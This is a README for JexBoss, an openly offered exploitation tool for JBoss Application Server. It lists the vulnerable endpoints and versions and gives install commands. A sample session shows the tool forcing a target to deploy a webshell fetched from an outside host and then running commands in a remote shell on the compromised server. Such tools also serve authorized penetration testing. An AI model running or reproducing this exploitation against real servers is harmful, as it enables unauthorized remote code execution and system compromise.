JexBoss - Jboss verify and EXploitation Tool
=======

JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server.

Requirements
----
* Python >= 2.7.x
* [urllib3](https://pypi.python.org/pypi/urllib3)

Installation
----
To install the latest version of JexBoss, please use the following commands:

	git clone https://github.com/joaomatosf/jexboss.git
	cd jexboss
	python jexboss.py

Features
----
The tool and exploits were developed and tested for versions 3, 4, 5 and 6 of the JBoss Application Server.

The exploitation vectors are:

* /jmx-console
	- tested and working in JBoss versions 4, 5 and 6
* /web-console/Invoker
	- tested and working in JBoss versions 4
* /invoker/JMXInvokerServlet
	- tested and working in JBoss versions 4 and 5

Usage example
----
* Check the file "demo.png"

```
$ git clone https://github.com/joaomatosf/jexboss.git
$ cd jexboss
$ python jexboss.py https://site-teste.com

 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#


 ** Checking Host: https://site-teste.com **

 * Checking web-console: 	       [ OK ]
 * Checking jmx-console: 	       [ VULNERABLE ]
 * Checking JMXInvokerServlet: 	       [ VULNERABLE ]


 * Do you want to try to run an automated exploitation via "jmx-console" ?
   This operation will provide a simple command shell to execute commands on the server..
   Continue only if you have permission!
   yes/NO ? yes

 * Sending exploit code to https://site-teste.com. Wait...


 * Info: This exploit will force the server to deploy the webshell
   available on: http://www.joaomatosf.com/rnp/jbossass.war
 * Successfully deployed code! Starting command shell, wait...

 * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - *

 * https://site-teste.com:

 Linux fwgw 2.6.32-431.29.2.el6.x86_64 #1 SMP Tue Sep 9 21:36:05 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

 CentOS release 6.5 (Final)

 uid=509(jboss) gid=509(jboss) grupos=509(jboss) context=system_u:system_r:initrc_t:s0

[Type commands or "exit" to finish]
Shell> pwd
/usr/jboss-6.1.0.Final/bin

[Type commands or "exit" to finish]
Shell> hostname
fwgw

[Type commands or "exit" to finish]
Shell> ls -all /tmp
total 35436
drwxrwxrwt.  4 root root     4096 Nov 24 16:36 .
dr-xr-xr-x. 22 root root     4096 Nov 23 03:26 ..
-rw-r--r--.  1 root root 34630995 Out 15 18:07 snortrules-snapshot-2962.tar.gz
-rw-r--r--.  1 root root       32 Out 16 14:51 snortrules-snapshot-2962.tar.gz.md5
-rw-------.  1 root root        0 Set 20 16:45 yum.log
-rw-------.  1 root root     2743 Set 20 17:18 yum_save_tx-2014-09-20-17-18nQiKVo.yumtx
-rw-------.  1 root root     1014 Out  6 00:33 yum_save_tx-2014-10-06-00-33vig5iT.yumtx
-rw-------.  1 root root      543 Out  6 02:14 yum_save_tx-2014-10-06-02-143CcA5k.yumtx
-rw-------.  1 root root    18568 Out 14 03:04 yum_save_tx-2014-10-14-03-04Q9ywQt.yumtx
-rw-------.  1 root root      315 Out 15 16:00 yum_save_tx-2014-10-15-16-004hKzCF.yumtx

[Type commands or "exit" to finish]
Shell>
```

Questions, problems, suggestions and etc:
----

* joaomatosf@gmail.com

Donate:
----
* Please consider making a donation to help improve this tool, including research to new versions of JBoss and zero days.

* Bitcoin Address:  14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C
* URI:  bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss

